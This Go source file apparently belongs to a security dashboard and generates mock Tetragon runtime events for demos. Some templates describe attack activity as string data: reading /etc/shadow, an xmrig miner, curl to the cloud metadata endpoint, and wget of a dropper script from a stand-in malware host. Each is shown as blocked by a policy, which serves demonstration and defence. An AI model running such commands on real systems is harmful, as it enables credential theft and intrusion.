package mock

import (
	"context"
	"fmt"
	"math/rand"
	"time"

	"github.com/isovalent-control/isovalent-control/backend/internal/tetragon"
)

type eventTemplate struct {
	typ, ns, workload, binary, args, parent, function, action, policy, details string
	weight                                                                     int
}

var eventTemplates = []eventTemplate{
	// Benign baseline activity.
	{"process_exec", "web", "frontend", "/usr/local/bin/node", "server.js", "/bin/sh", "", "", "", "", 6},
	{"process_exec", "shop", "checkout", "/app/checkout", "--port=5050", "/sbin/tini", "", "", "", "", 5},
	{"process_exec", "kube-system", "coredns", "/coredns", "-conf /etc/coredns/Corefile", "/usr/bin/containerd-shim", "", "", "", "", 2},
	{"process_exit", "shop", "cart", "/app/cart", "", "/sbin/tini", "", "", "", "exit code 0", 3},
	{"process_kprobe", "pay", "payments", "/app/payments", "", "/sbin/tini", "tcp_connect", "POST", "monitor-egress-connections", "10.96.14.7:5432", 4},
	// Suspicious / enforced activity.
	{"process_exec", "web", "frontend", "/bin/bash", "-i", "/usr/local/bin/node", "", "", "", "interactive shell in container", 2},
	{"process_kprobe", "web", "frontend", "/bin/cat", "/etc/shadow", "/bin/bash", "security_file_permission", "SIGKILL", "file-integrity-monitoring", "/etc/shadow", 2},
	{"process_kprobe", "default", "crypto-miner", "/tmp/xmrig", "-o pool.minexmr.com:4444", "/bin/sh", "tcp_connect", "SIGKILL", "block-mining-pools", "104.28.12.34:4444", 2},
	{"process_kprobe", "shop", "checkout", "/usr/bin/curl", "http://169.254.169.254/latest/meta-data/", "/app/checkout", "tcp_connect", "SIGKILL", "block-metadata-service", "169.254.169.254:80", 1},
	{"process_tracepoint", "pay", "postgres", "/usr/lib/postgresql/bin/postgres", "", "/sbin/tini", "raw_syscalls/sys_enter", "", "audit-db-syscalls", "", 2},
	{"process_kprobe", "web", "gateway", "/usr/bin/wget", "http://malware-cdn.example/dropper.sh", "/bin/sh", "security_bprm_check", "OVERRIDE", "block-unsigned-binaries", "/tmp/dropper.sh", 1},
}

// TetragonSource generates demo runtime-security events.
type TetragonSource struct {
	rng *rand.Rand
}

// NewTetragonSource returns a demo event generator.
func NewTetragonSource() *TetragonSource {
	return &TetragonSource{rng: rand.New(rand.NewSource(time.Now().UnixNano() ^ 0x7e7a90))}
}

// Events implements tetragon.Source.
func (s *TetragonSource) Events(ctx context.Context) (<-chan tetragon.Event, error) {
	out := make(chan tetragon.Event, 256)
	var pool []int
	for i, t := range eventTemplates {
		for j := 0; j < t.weight; j++ {
			_ = j
			pool = append(pool, i)
		}
	}
	go func() {
		defer close(out)
		ticker := time.NewTicker(700 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				if s.rng.Float64() < 0.25 {
					continue // irregular cadence
				}
				t := eventTemplates[pool[s.rng.Intn(len(pool))]]
				ev := tetragon.Event{
					Time:      time.Now(),
					Type:      t.typ,
					Namespace: t.ns,
					Workload:  t.workload,
					Pod:       fmt.Sprintf("%s-%04x-%c%c", t.workload, s.rng.Intn(3)+0x6b00, 'a'+rune(s.rng.Intn(26)), 'a'+rune(s.rng.Intn(26))),
					Node:      fmt.Sprintf("node-%d", 1+s.rng.Intn(3)),
					Binary:    t.binary,
					Args:      t.args,
					Parent:    t.parent,
					Function:  t.function,
					Action:    t.action,
					Policy:    t.policy,
					Details:   t.details,
				}
				select {
				case out <- ev:
				default:
				}
			}
		}
	}()
	return out, nil
}
